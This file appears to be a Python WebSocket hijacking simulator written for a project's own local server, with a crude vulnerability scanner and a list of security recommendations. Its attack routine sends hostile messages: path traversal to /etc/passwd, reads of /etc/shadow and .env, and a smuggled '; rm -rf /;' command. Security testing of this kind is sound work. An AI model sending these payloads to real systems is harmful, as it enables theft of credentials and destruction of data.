#!/usr/bin/env python3

# [DNA_TAG]
# ORIGIN: Crostini-Chromebook
# PILLAR: codecity-backend
# DEPS: asyncio, datetime, json, logging, os, pathlib, random, typing, websockets
# ROLE: WEBSOCKET HIJACKING ATTACK SIMULATOR
# AUTHOR: Buffy (Codebuff AI)
# SESSION: 2026-08-22 Bucket 08 DNA Sweep
# TIER: Attack (4)
# [/DNA_TAG]

"""
WEBSOCKET HIJACKING ATTACK SIMULATOR
Simulates WebSocket connection hijacking and message manipulation
"""

import os
import json
import asyncio
import websockets
import random
from pathlib import Path
from typing import Dict, List
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class WebSocketHijackingAttack:
    """Simulates WebSocket hijacking attacks against the Rampage Refactor server"""
    
    def __init__(self, target_url: str = "ws://localhost:8765"):
        self.target_url = target_url
        self.vulnerabilities_found = []
        self.attack_log = []
        self.successful_hijacks = []
        
        # Malicious WebSocket messages
        self.malicious_messages = [
            {
                'action': 'scan',
                'path': '../../../etc/passwd',
                'description': 'Directory traversal via WebSocket'
            },
            {
                'action': 'get_file_content',
                'file_path': '/etc/shadow',
                'line_number': 1,
                'description': 'Sensitive file access'
            },
            {
                'action': 'deploy_agent',
                'monster_id': 'malicious_agent',
                'description': 'Malicious agent deployment'
            },
            {
                'action': 'scan',
                'path': '; rm -rf /;',
                'description': 'Command injection attempt'
            },
            {
                'action': 'get_file_content',
                'file_path': '.env',
                'line_number': 1,
                'description': 'Environment file theft'
            }
        ]
    
    def scan_for_vulnerabilities(self, codebase_path: str) -> List[Dict]:
        """Scan codebase for WebSocket vulnerabilities"""
        logger.info(f"🔍 Scanning {codebase_path} for WebSocket vulnerabilities...")
        
        vulnerabilities = []
        codebase = Path(codebase_path)
        
        # Look for WebSocket server implementations
        py_files = list(codebase.rglob('*.py'))
        for py_file in py_files:
            try:
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Check for WebSocket usage
                if 'websocket' in content.lower() or 'websockets' in content.lower():
                    # Look for security issues
                    security_issues = []
                    
                    # No authentication
                    if 'auth' not in content.lower() and 'token' not in content.lower():
                        security_issues.append('No authentication mechanism')
                    
                    # No message validation
                    if 'validate' not in content.lower():
                        security_issues.append('No message validation')
                    
                    # No rate limiting
                    if 'rate' not in content.lower() and 'limit' not in content.lower():
                        security_issues.append('No rate limiting')
                    
                    # No origin checking
                    if 'origin' not in content.lower():
                        security_issues.append('No origin verification')
                    
                    if security_issues:
                        vulnerabilities.append({
                            'file': str(py_file),
                            'type': 'websocket_security_issues',
                            'issues': security_issues,
                            'severity': 'high',
                            'description': f'WebSocket server with security issues: {", ".join(security_issues)}'
                        })
                        
            except Exception as e:
                logger.warning(f"Error scanning {py_file}: {e}")
        
        self.vulnerabilities_found = vulnerabilities
        logger.info(f"✅ Found {len(vulnerabilities)} WebSocket vulnerabilities")
        
        return vulnerabilities
    
    async def launch_hijacking_attack(self) -> Dict:
        """Simulate WebSocket hijacking attack"""
        logger.info(f"🚀 Launching WebSocket hijacking attack against {self.target_url}...")
        
        attack_results = {
            'attack_type': 'websocket_hijacking',
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'messages_sent': [],
            'responses_received': [],
            'hijack_success': False,
            'sensitive_data_leaked': []
        }
        
        try:
            async with websockets.connect(self.target_url) as websocket:
                logger.info("✅ Connected to WebSocket server")
                
                # Send malicious messages
                for message in self.malicious_messages:
                    try:
                        logger.info(f"📤 Sending malicious message: {message['action']}")
                        
                        await websocket.send(json.dumps(message))
                        attack_results['messages_sent'].append({
                            'message': message,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        # Wait for response
                        response = await asyncio.wait_for(websocket.recv(), timeout=5.0)
                        response_data = json.loads(response)
                        
                        attack_results['responses_received'].append({
                            'request': message,
                            'response': response_data,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                        # Check if attack was successful
                        if response_data.get('type') == 'file_content':
                            attack_results['hijack_success'] = True
                            attack_results['sensitive_data_leaked'].append({
                                'file': message.get('file_path', 'unknown'),
                                'data': response_data.get('data', {}).get('lines', []),
                                'severity': 'critical'
                            })
                            logger.warning(f"⚠️  Successfully leaked data from {message.get('file_path')}")
                        
                        elif response_data.get('type') == 'city_data':
                            attack_results['hijack_success'] = True
                            logger.warning("⚠️  Successfully triggered unauthorized scan")
                        
                        # Simulate some delay between messages
                        await asyncio.sleep(1.0)
                        
                    except asyncio.TimeoutError:
                        logger.warning("⏱️  Response timeout")
                        break
                    except Exception as e:
                        logger.error(f"Error sending message: {e}")
                        break
        
        except websockets.exceptions.ConnectionClosed:
            logger.warning("❌ Connection closed by server")
        except Exception as e:
            logger.error(f"Connection error: {e}")
        
        if attack_results['hijack_success']:
            logger.warning("🔴 WEBSOCKET HIJACKING ATTACK SUCCESSFUL!")
            logger.warning(f"📊 Leaked {len(attack_results['sensitive_data_leaked'])} sensitive data items")
        else:
            logger.info("🟢 WebSocket hijacking attack blocked")
        
        self.successful_hijacks.append(attack_results)
        return attack_results
    
    def generate_report(self) -> Dict:
        """Generate a comprehensive attack report"""
        report = {
            'attack_type': 'websocket_hijacking',
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities_found': len(self.vulnerabilities_found),
            'vulnerabilities': self.vulnerabilities_found,
            'hijack_attempts': len(self.attack_log),
            'successful_hijacks': len(self.successful_hijacks),
            'messages_sent': len([item for attack in self.successful_hijacks for item in attack.get('messages_sent', [])]),
            'sensitive_data_leaked': len([item for attack in self.successful_hijacks for item in attack.get('sensitive_data_leaked', [])]),
            'recommendations': self._generate_recommendations()
        }
        
        return report
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        recommendations = [
            "✅ Implement WebSocket authentication (JWT, API keys)",
            "✅ Validate all incoming WebSocket messages",
            "✅ Implement origin verification for WebSocket connections",
            "✅ Add rate limiting to WebSocket endpoints",
            "✅ Use message schemas and validation libraries",
            "✅ Implement proper error handling that doesn't leak information",
            "✅ Use WebSocket subprotocols for message typing",
            "✅ Implement connection timeouts and keep-alive mechanisms",
            "✅ Add logging and monitoring for suspicious WebSocket activity",
            "✅ Use WebSocket-specific security headers",
            "✅ Conduct regular WebSocket security audits"
        ]
        
        return recommendations
    
    def save_report(self, output_file: str = None) -> str:
        """Save attack report to file"""
        if not output_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"websocket_hijacking_report_{timestamp}.json"
        
        report = self.generate_report()
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2)
        
        logger.info(f"📄 Report saved to: {output_file}")
        return output_file


async def main():
    import sys
    import argparse
    import re  # Import here for the main function
    
    parser = argparse.ArgumentParser(description='WebSocket Hijacking Attack Simulator')
    parser.add_argument('--url', default='ws://localhost:8765', help='Target WebSocket URL')
    parser.add_argument('codebase', help='Codebase to scan for vulnerabilities')
    parser.add_argument('--scan-only', action='store_true', help='Only scan for vulnerabilities')
    parser.add_argument('--report', help='Save report to specific file')
    
    args = parser.parse_args()
    
    if not os.path.exists(args.codebase):
        print(f"❌ Codebase not found: {args.codebase}")
        return
    
    attack = WebSocketHijackingAttack(args.url)
    
    print("🕸️ WEBSOCKET HIJACKING ATTACK SIMULATOR")
    print("=" * 50)
    
    # Scan for vulnerabilities
    vulnerabilities = attack.scan_for_vulnerabilities(args.codebase)
    
    if vulnerabilities:
        print(f"⚠️  Found {len(vulnerabilities)} WebSocket vulnerabilities:")
        for vuln in vulnerabilities[:5]:  # Show first 5
            print(f"  • {vuln['description']} ({vuln['file']})")
        if len(vulnerabilities) > 5:
            print(f"  ... and {len(vulnerabilities) - 5} more")
    else:
        print("✅ No obvious WebSocket vulnerabilities found")
    
    if not args.scan_only:
        print(f"\n🚀 Launching hijacking attack against {args.url}...")
        results = await attack.launch_hijacking_attack()
        
        if results['hijack_success']:
            print("🔴 HIJACKING ATTACK SUCCESSFUL!")
            print(f"📤 Sent {len(results['messages_sent'])} malicious messages")
            print(f"💀 Leaked {len(results['sensitive_data_leaked'])} sensitive data items")
        else:
            print("🟢 Hijacking attack blocked")
    
    # Save report
    report_file = args.report or f"websocket_hijacking_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    attack.save_report(report_file)
    print(f"\n📄 Full report saved to: {report_file}")


if __name__ == "__main__":
    import re  # Import for regex operations
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Attack interrupted by user")